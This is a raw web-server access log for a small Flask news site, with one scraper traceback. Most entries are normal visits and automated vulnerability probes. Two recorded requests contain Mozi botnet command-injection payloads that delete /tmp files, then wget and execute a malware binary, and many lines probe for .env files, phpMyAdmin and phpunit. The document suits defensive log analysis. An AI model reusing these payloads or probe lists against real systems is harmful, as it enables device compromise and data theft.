 * Serving Flask app "app" (lazy loading)
 * Environment: production
   WARNING: This is a development server. Do not use it in a production deployment.
   Use a production WSGI server instead.
 * Debug mode: on
 * Running on http://0.0.0.0:5000/ (Press CTRL+C to quit)
122.234.174.177 - - [24/Jan/2021 13:50:21] "[37mGET / HTTP/1.1[0m" 200 -
89.248.170.31 - - [24/Jan/2021 14:14:48] "[33mPOST /cgi-bin-igd/netcore_set.cgi HTTP/1.1[0m" 404 -
180.44.246.97 - - [24/Jan/2021 14:31:31] "[37mGET / HTTP/1.1[0m" 200 -
107.173.146.196 - - [24/Jan/2021 14:35:10] "[33mGET /login HTTP/1.0[0m" 404 -
107.173.146.196 - - [24/Jan/2021 14:35:11] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
107.173.146.196 - - [24/Jan/2021 14:35:11] "[33mGET /manager/html HTTP/1.0[0m" 404 -
181.48.29.77 - - [24/Jan/2021 14:42:29] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [24/Jan/2021 15:08:14] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [24/Jan/2021 15:08:14] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [24/Jan/2021 15:08:22] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [24/Jan/2021 15:08:23] "[37mGET /hottest HTTP/1.1[0m" 200 -
175.124.132.140 - - [24/Jan/2021 15:08:24] "[37mGET /api/hottest?date=2021-1-25 HTTP/1.1[0m" 200 -
175.124.132.140 - - [24/Jan/2021 15:08:26] "[37mGET /api/hottest?date=2021-1-24 HTTP/1.1[0m" 200 -
45.95.168.120 - - [24/Jan/2021 15:16:42] "[37mGET / HTTP/1.1[0m" 200 -
167.248.133.37 - - [24/Jan/2021 15:28:00] "[37mGET / HTTP/1.1[0m" 200 -
167.248.133.37 - - [24/Jan/2021 15:28:01] "[37mGET / HTTP/1.1[0m" 200 -
185.154.73.143 - - [24/Jan/2021 15:35:58] "[37mGET / HTTP/1.1[0m" 200 -
104.154.204.209 - - [24/Jan/2021 16:01:51] "[33mGET /.env HTTP/1.1[0m" 404 -
104.154.204.209 - - [24/Jan/2021 16:01:51] "[31m[1mPOST / HTTP/1.1[0m" 405 -
104.154.204.209 - - [24/Jan/2021 16:17:42] "[33mGET /.env HTTP/1.1[0m" 404 -
104.154.204.209 - - [24/Jan/2021 16:17:43] "[31m[1mPOST / HTTP/1.1[0m" 405 -
200.109.34.147 - - [24/Jan/2021 16:36:30] "[33mGET /struts2-rest-showcase/orders.xhtml HTTP/1.1[0m" 404 -
200.109.34.147 - - [24/Jan/2021 16:36:31] "[33mGET /index.action HTTP/1.1[0m" 404 -
200.109.34.147 - - [24/Jan/2021 16:36:32] "[33mGET /index.do HTTP/1.1[0m" 404 -
186.33.104.81 - - [24/Jan/2021 17:28:44] "[33mGET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:41:56] "[33mGET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:41:57] "[33mGET /phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:41:57] "[33mGET /phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:41:58] "[33mGET /pma/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:41:58] "[33mGET /myadmin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:41:58] "[33mGET /MyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:41:59] "[33mGET /phpmanager/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:00] "[33mGET /php-my-admin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:00] "[33mGET /phpmyadmin1/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:00] "[33mGET /phpMyAdmin2/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:01] "[33mGET /phpMyAdmin3/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:01] "[33mGET /phpMyAdmi/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:02] "[33mGET /phpmy/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:02] "[33mGET /phpMyAdmin-2/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:03] "[33mGET /phpMyAdmin-3/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:03] "[33mGET /admin/pma/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:04] "[33mGET /mysql/db/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:04] "[33mGET /PMA/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:05] "[33mGET /sql/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:05] "[33mGET /phpMyAdminold/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:05] "[33mGET /phpmy-admin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:06] "[33mGET /db-admin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:06] "[33mGET /admin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [24/Jan/2021 17:42:06] "[33mGET /scripts/setup.php HTTP/1.1[0m" 404 -
198.98.61.98 - - [24/Jan/2021 17:47:15] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
49.119.93.74 - - [24/Jan/2021 17:50:54] "[33mGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://192.168.1.1:8088/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1 HTTP/1.0[0m" 404 -
168.181.39.47 - - [24/Jan/2021 18:25:28] "[37mGET / HTTP/1.1[0m" 200 -
47.100.32.89 - - [24/Jan/2021 18:34:16] "[33mGET /login HTTP/1.0[0m" 404 -
47.100.32.89 - - [24/Jan/2021 18:34:16] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
47.100.32.89 - - [24/Jan/2021 18:34:16] "[33mGET /manager/html HTTP/1.0[0m" 404 -
221.0.20.17 - - [24/Jan/2021 18:44:07] "[37mHEAD http://110.242.68.4/ HTTP/1.1[0m" 200 -
106.45.8.192 - - [24/Jan/2021 18:44:12] "[33mCONNECT www.baidu.com:443 HTTP/1.1[0m" 404 -
167.71.108.96 - - [24/Jan/2021 19:02:24] "[33mGET /login HTTP/1.0[0m" 404 -
167.71.108.96 - - [24/Jan/2021 19:02:25] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
167.71.108.96 - - [24/Jan/2021 19:02:25] "[33mGET /manager/html HTTP/1.0[0m" 404 -
211.176.125.70 - - [24/Jan/2021 19:07:55] "[37mGET /api/hottest?date=2021-1-25 HTTP/1.0[0m" 200 -
74.120.14.56 - - [24/Jan/2021 19:23:08] "[37mGET / HTTP/1.1[0m" 200 -
74.120.14.56 - - [24/Jan/2021 19:23:08] "[37mGET / HTTP/1.1[0m" 200 -
40.121.52.49 - - [24/Jan/2021 19:24:38] "[33mGET /.env HTTP/1.1[0m" 404 -
40.121.52.49 - - [24/Jan/2021 19:24:38] "[31m[1mPOST / HTTP/1.1[0m" 405 -
51.210.248.34 - - [24/Jan/2021 19:40:25] "[33mGET /login HTTP/1.0[0m" 404 -
51.210.248.34 - - [24/Jan/2021 19:40:26] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
51.210.248.34 - - [24/Jan/2021 19:40:26] "[33mGET /manager/html HTTP/1.0[0m" 404 -
128.14.134.134 - - [24/Jan/2021 20:54:08] "[37mGET / HTTP/1.1[0m" 200 -
40.121.52.49 - - [24/Jan/2021 21:09:10] "[33mGET /.env HTTP/1.1[0m" 404 -
40.121.52.49 - - [24/Jan/2021 21:09:11] "[31m[1mPOST / HTTP/1.1[0m" 405 -
104.131.165.181 - - [24/Jan/2021 21:32:04] "[37mGET / HTTP/1.0[0m" 200 -
13.234.112.157 - - [24/Jan/2021 21:51:31] "[33mGET /login HTTP/1.0[0m" 404 -
13.234.112.157 - - [24/Jan/2021 21:51:31] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
13.234.112.157 - - [24/Jan/2021 21:51:32] "[33mGET /manager/html HTTP/1.0[0m" 404 -
185.239.242.162 - - [24/Jan/2021 22:02:45] "[37mGET / HTTP/1.1[0m" 200 -
209.17.96.90 - - [24/Jan/2021 22:03:38] "[37mGET / HTTP/1.1[0m" 200 -
182.92.91.135 - - [24/Jan/2021 22:47:27] "[33mGET /login HTTP/1.0[0m" 404 -
182.92.91.135 - - [24/Jan/2021 22:47:27] "[33mGET /manager/html HTTP/1.0[0m" 404 -
175.184.164.79 - - [24/Jan/2021 22:47:28] "[37mHEAD http://110.242.68.4/ HTTP/1.1[0m" 200 -
106.45.9.0 - - [24/Jan/2021 22:47:31] "[33mCONNECT www.baidu.com:443 HTTP/1.1[0m" 404 -
47.103.0.170 - - [24/Jan/2021 23:07:32] "[33mGET /login HTTP/1.0[0m" 404 -
47.103.0.170 - - [24/Jan/2021 23:07:34] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
47.103.0.170 - - [24/Jan/2021 23:07:35] "[33mGET /manager/html HTTP/1.0[0m" 404 -
209.141.60.195 - - [24/Jan/2021 23:14:15] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
213.239.101.58 - - [24/Jan/2021 23:14:34] "[37mGET / HTTP/1.1[0m" 200 -
121.41.39.138 - - [24/Jan/2021 23:30:09] "[33mGET /login HTTP/1.0[0m" 404 -
121.41.39.138 - - [24/Jan/2021 23:30:09] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
121.41.39.138 - - [24/Jan/2021 23:30:09] "[33mGET /manager/html HTTP/1.0[0m" 404 -
115.238.65.122 - - [24/Jan/2021 23:59:55] "[37mGET / HTTP/1.1[0m" 200 -
115.238.65.122 - - [24/Jan/2021 23:59:58] "[33mGET /TP/public/index.php HTTP/1.1[0m" 404 -
192.241.222.162 - - [25/Jan/2021 00:11:42] "[37mGET / HTTP/1.1[0m" 200 -
180.163.220.3 - - [25/Jan/2021 00:32:25] "[37mGET / HTTP/1.1[0m" 200 -
180.163.220.68 - - [25/Jan/2021 00:32:32] "[37mGET /static/newsclip.png HTTP/1.1[0m" 200 -
180.163.220.68 - - [25/Jan/2021 00:32:32] "[37mGET /static/css/main.css HTTP/1.1[0m" 200 -
180.163.220.5 - - [25/Jan/2021 00:32:32] "[37mGET /static/img_home.jpg HTTP/1.1[0m" 200 -
162.142.125.56 - - [25/Jan/2021 00:37:52] "[37mGET / HTTP/1.1[0m" 200 -
162.142.125.56 - - [25/Jan/2021 00:37:53] "[37mGET / HTTP/1.1[0m" 200 -
178.72.68.103 - - [25/Jan/2021 01:00:00] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
178.72.68.103 - - [25/Jan/2021 01:00:00] "[35m[1m27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0[0m" HTTPStatus.BAD_REQUEST -
192.241.224.163 - - [25/Jan/2021 01:12:02] "[37mGET / HTTP/1.1[0m" 200 -
47.115.44.111 - - [25/Jan/2021 01:17:48] "[33mGET /login HTTP/1.0[0m" 404 -
47.115.44.111 - - [25/Jan/2021 01:17:49] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
47.115.44.111 - - [25/Jan/2021 01:17:50] "[33mGET /manager/html HTTP/1.0[0m" 404 -
175.152.28.103 - - [25/Jan/2021 01:27:19] "[37mHEAD http://110.242.68.4/ HTTP/1.1[0m" 200 -
180.95.238.214 - - [25/Jan/2021 01:27:24] "[33mCONNECT www.baidu.com:443 HTTP/1.1[0m" 404 -
34.220.129.138 - - [25/Jan/2021 01:33:31] "[37mGET / HTTP/1.1[0m" 200 -
34.220.129.138 - - [25/Jan/2021 01:33:31] "[37mGET /static/css/main.css HTTP/1.1[0m" 200 -
34.220.129.138 - - [25/Jan/2021 01:33:31] "[37mGET /static/newsclip.png HTTP/1.1[0m" 200 -
34.220.129.138 - - [25/Jan/2021 01:33:31] "[37mGET /static/img_home.jpg HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:33:57] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:33:58] "[33mGET /apple-touch-icon-120x120-precomposed.png HTTP/1.1[0m" 404 -
175.124.132.140 - - [25/Jan/2021 01:33:58] "[33mGET /apple-touch-icon-120x120.png HTTP/1.1[0m" 404 -
175.124.132.140 - - [25/Jan/2021 01:33:58] "[33mGET /apple-touch-icon-precomposed.png HTTP/1.1[0m" 404 -
175.124.132.140 - - [25/Jan/2021 01:33:58] "[33mGET /apple-touch-icon.png HTTP/1.1[0m" 404 -
175.124.132.140 - - [25/Jan/2021 01:33:59] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:34:00] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:34:09] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:34:11] "[37mGET /hottest HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:34:11] "[37mGET /api/hottest?date=2021-1-25 HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:34:12] "[37mGET /api/hottest?date=2021-1-24 HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:34:13] "[37mGET /api/hottest?date=2021-1-25 HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:34:16] "[37mGET /api/hottest?date=2021-1-24 HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:34:23] "[37mGET /api/hottest?date=2021-1-25 HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:34:24] "[37mGET /api/hottest?date=2021-1-25 HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:34:24] "[37mGET /api/hottest?date=2021-1-25 HTTP/1.1[0m" 200 -
209.17.97.66 - - [25/Jan/2021 01:40:38] "[37mGET / HTTP/1.0[0m" 200 -
147.147.220.62 - - [25/Jan/2021 01:56:36] "[37mGET / HTTP/1.1[0m" 200 -
212.102.57.241 - - [25/Jan/2021 01:56:36] "[37mGET / HTTP/1.1[0m" 200 -
45.133.194.236 - - [25/Jan/2021 01:56:36] "[37mGET / HTTP/1.1[0m" 200 -
2.58.29.24 - - [25/Jan/2021 01:56:36] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:57:37] "[36mGET /static/css/main.css HTTP/1.1[0m" 304 -
175.124.132.140 - - [25/Jan/2021 01:57:37] "[36mGET /static/newsclip.png HTTP/1.1[0m" 304 -
175.124.132.140 - - [25/Jan/2021 01:57:38] "[37mGET /api/hottest?date=2021-1-25 HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 01:57:39] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
192.241.220.4 - - [25/Jan/2021 01:59:20] "[37mGET / HTTP/1.1[0m" 200 -
45.143.147.38 - - [25/Jan/2021 02:03:57] "[33mGET /.env HTTP/1.1[0m" 404 -
45.143.147.38 - - [25/Jan/2021 02:03:58] "[31m[1mPOST / HTTP/1.1[0m" 405 -
175.124.132.140 - - [25/Jan/2021 02:17:25] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 02:17:25] "[36mGET /static/newsclip.png HTTP/1.1[0m" 304 -
175.124.132.140 - - [25/Jan/2021 02:17:25] "[36mGET /static/css/main.css HTTP/1.1[0m" 304 -
175.124.132.140 - - [25/Jan/2021 02:17:25] "[36mGET /static/img_home.jpg HTTP/1.1[0m" 304 -
175.124.132.140 - - [25/Jan/2021 02:17:26] "[36mGET /static/newsclip.png HTTP/1.1[0m" 304 -
175.124.132.140 - - [25/Jan/2021 02:17:26] "[36mGET /static/img_home.jpg HTTP/1.1[0m" 304 -
175.124.132.140 - - [25/Jan/2021 02:17:26] "[36mGET /static/css/main.css HTTP/1.1[0m" 304 -
175.124.132.140 - - [25/Jan/2021 02:17:26] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 02:17:26] "[36mGET /static/south-korea.png HTTP/1.1[0m" 304 -
175.124.132.140 - - [25/Jan/2021 02:17:27] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 02:20:16] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 02:20:17] "[37mGET /hottest HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 02:20:17] "[36mGET /static/united-states-of-america.png HTTP/1.1[0m" 304 -
175.124.132.140 - - [25/Jan/2021 02:20:17] "[37mGET /api/hottest?date=2021-1-25 HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 02:20:27] "[37mGET /api/hottest?date=2021-1-24 HTTP/1.1[0m" 200 -
220.178.61.203 - - [25/Jan/2021 02:31:41] "[33mGET /login HTTP/1.0[0m" 404 -
220.178.61.203 - - [25/Jan/2021 02:31:41] "[33mGET /jenkins/login HTTP/1.0[0m" 404 -
220.178.61.203 - - [25/Jan/2021 02:31:41] "[33mGET /manager/html HTTP/1.0[0m" 404 -
175.124.132.140 - - [25/Jan/2021 02:34:05] "[37mGET / HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 02:34:06] "[36mGET /static/img_home.jpg HTTP/1.1[0m" 304 -
175.124.132.140 - - [25/Jan/2021 02:34:07] "[37mGET /latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 02:34:09] "[37mGET /api/latest HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 02:34:09] "[36mGET /static/south-korea.png HTTP/1.1[0m" 304 -
175.124.132.140 - - [25/Jan/2021 02:34:14] "[37mGET /hottest HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 02:34:15] "[37mGET /api/hottest?date=2021-1-25 HTTP/1.1[0m" 200 -
175.124.132.140 - - [25/Jan/2021 02:34:15] "[36mGET /static/united-states-of-america.png HTTP/1.1[0m" 304 -
209.17.96.226 - - [25/Jan/2021 02:47:26] "[37mGET / HTTP/1.1[0m" 200 -
54.249.204.48 - - [25/Jan/2021 03:04:55] "[37mGET /static/newsclip.png HTTP/1.1[0m" 200 -
41.60.235.22 - - [25/Jan/2021 03:05:08] "[37mGET / HTTP/1.1[0m" 200 -
209.17.96.194 - - [25/Jan/2021 03:06:27] "[37mGET / HTTP/1.0[0m" 200 -
183.219.172.246 - - [25/Jan/2021 03:49:25] "[37mGET / HTTP/1.1[0m" 200 -
45.143.147.38 - - [25/Jan/2021 03:52:03] "[33mGET /.env HTTP/1.1[0m" 404 -
34.223.105.45 - - [25/Jan/2021 04:01:12] "[37mGET / HTTP/1.1[0m" 200 -
209.141.58.232 - - [25/Jan/2021 04:12:40] "[33mGET /w00tw00t.at.blackhats.romanian.anti-sec:) HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:41] "[33mGET /phpMyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:41] "[33mGET /phpmyadmin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:41] "[33mGET /pma/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:42] "[33mGET /myadmin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:42] "[33mGET /MyAdmin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:42] "[33mGET /phpmanager/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:43] "[33mGET /php-my-admin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:43] "[33mGET /phpmyadmin1/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:44] "[33mGET /phpMyAdmin2/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:44] "[33mGET /phpMyAdmin3/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:45] "[33mGET /phpMyAdmi/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:45] "[33mGET /phpmy/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:45] "[33mGET /phpMyAdmin-2/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:46] "[33mGET /phpMyAdmin-3/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:46] "[33mGET /admin/pma/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:47] "[33mGET /mysql/db/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:47] "[33mGET /PMA/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:48] "[33mGET /sql/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:48] "[33mGET /phpMyAdminold/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:49] "[33mGET /phpmy-admin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:49] "[33mGET /db-admin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:49] "[33mGET /admin/scripts/setup.php HTTP/1.1[0m" 404 -
209.141.58.232 - - [25/Jan/2021 04:12:50] "[33mGET /scripts/setup.php HTTP/1.1[0m" 404 -
179.43.140.152 - - [25/Jan/2021 04:36:41] "[33mPOST /boaform/admin/formLogin HTTP/1.1[0m" 404 -
Traceback (most recent call last):
  File "init_db.py", line 105, in <module>
    run()
  File "init_db.py", line 102, in run
    schedule.run_pending()
  File "/home/ubuntu/.local/lib/python3.8/site-packages/schedule/__init__.py", line 563, in run_pending
    default_scheduler.run_pending()
  File "/home/ubuntu/.local/lib/python3.8/site-packages/schedule/__init__.py", line 94, in run_pending
    self._run_job(job)
  File "/home/ubuntu/.local/lib/python3.8/site-packages/schedule/__init__.py", line 147, in _run_job
    ret = job.run()
  File "/home/ubuntu/.local/lib/python3.8/site-packages/schedule/__init__.py", line 466, in run
    ret = self.job_func()
  File "init_db.py", line 96, in job
    get_latest_article()
  File "init_db.py", line 42, in get_latest_article
    title = soup2.select_one('div.article_header > div.article_info > h3').text
AttributeError: 'NoneType' object has no attribute 'text'
41.248.133.236 - - [25/Jan/2021 04:48:43] "[33mGET /.env HTTP/1.1[0m" 404 -
41.248.133.236 - - [25/Jan/2021 04:48:43] "[31m[1mPOST / HTTP/1.1[0m" 405 -
218.55.26.134 - - [25/Jan/2021 05:05:21] "[37mGET / HTTP/1.1[0m" 200 -
218.55.26.134 - - [25/Jan/2021 05:05:22] "[37mGET /static/css/main.css HTTP/1.1[0m" 200 -
218.55.26.134 - - [25/Jan/2021 05:05:22] "[37mGET /static/img_home.jpg HTTP/1.1[0m" 200 -
218.55.26.134 - - [25/Jan/2021 05:05:22] "[37mGET /static/newsclip.png HTTP/1.1[0m" 200 -
218.55.26.134 - - [25/Jan/2021 05:05:31] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
218.55.26.134 - - [25/Jan/2021 05:11:19] "[37mGET / HTTP/1.1[0m" 200 -
218.55.26.134 - - [25/Jan/2021 05:11:19] "[36mGET /static/css/main.css HTTP/1.1[0m" 304 -
218.55.26.134 - - [25/Jan/2021 05:11:19] "[36mGET /static/newsclip.png HTTP/1.1[0m" 304 -
218.55.26.134 - - [25/Jan/2021 05:11:19] "[36mGET /static/img_home.jpg HTTP/1.1[0m" 304 -
218.55.26.134 - - [25/Jan/2021 05:11:21] "[33mGET /favicon.ico HTTP/1.1[0m" 404 -
218.55.26.134 - - [25/Jan/2021 05:11:22] "[37mGET /latest HTTP/1.1[0m" 200 -
218.55.26.134 - - [25/Jan/2021 05:11:23] "[37mGET /api/latest HTTP/1.1[0m" 200 -
218.55.26.134 - - [25/Jan/2021 05:11:23] "[36mGET /static/south-korea.png HTTP/1.1[0m" 304 -
218.55.26.134 - - [25/Jan/2021 05:11:30] "[37mGET /hottest HTTP/1.1[0m" 200 -
218.55.26.134 - - [25/Jan/2021 05:11:31] "[37mGET /api/hottest?date=2021-1-25 HTTP/1.1[0m" 200 -
218.55.26.134 - - [25/Jan/2021 05:11:31] "[37mGET /static/united-states-of-america.png HTTP/1.1[0m" 200 -
89.248.170.31 - - [25/Jan/2021 05:21:44] "[37mGET / HTTP/1.1[0m" 200 -
104.223.103.13 - - [25/Jan/2021 05:43:19] "[37mGET / HTTP/1.1[0m" 200 -
164.68.112.178 - - [25/Jan/2021 06:16:17] "[37mGET / HTTP/1.0[0m" 200 -
222.186.136.150 - - [25/Jan/2021 06:23:40] "[33mCONNECT ip.ws.126.net:443 HTTP/1.1[0m" 404 -
159.203.100.104 - - [25/Jan/2021 06:27:26] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
202.5.37.130 - - [25/Jan/2021 06:27:59] "[37mGET / HTTP/1.1[0m" 200 -
193.118.53.210 - - [25/Jan/2021 06:58:20] "[37mGET / HTTP/1.1[0m" 200 -
209.141.60.195 - - [25/Jan/2021 08:25:24] "[33mGET /config/getuser?index=0 HTTP/1.1[0m" 404 -
23.129.64.232 - - [25/Jan/2021 09:58:55] "[37mGET / HTTP/1.1[0m" 200 -
51.103.129.12 - - [25/Jan/2021 10:13:34] "[33mGET /.env HTTP/1.1[0m" 404 -
51.103.129.12 - - [25/Jan/2021 10:13:35] "[31m[1mPOST / HTTP/1.1[0m" 405 -
54.169.174.226 - - [25/Jan/2021 10:18:19] "[33mGET /.env HTTP/1.1[0m" 404 -
54.169.174.226 - - [25/Jan/2021 10:18:22] "[31m[1mPOST / HTTP/1.1[0m" 405 -
45.155.205.108 - - [25/Jan/2021 11:06:47] "[33mPOST /api/jsonws/invoke HTTP/1.1[0m" 404 -
45.155.205.108 - - [25/Jan/2021 11:06:47] "[33mPOST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1[0m" 404 -
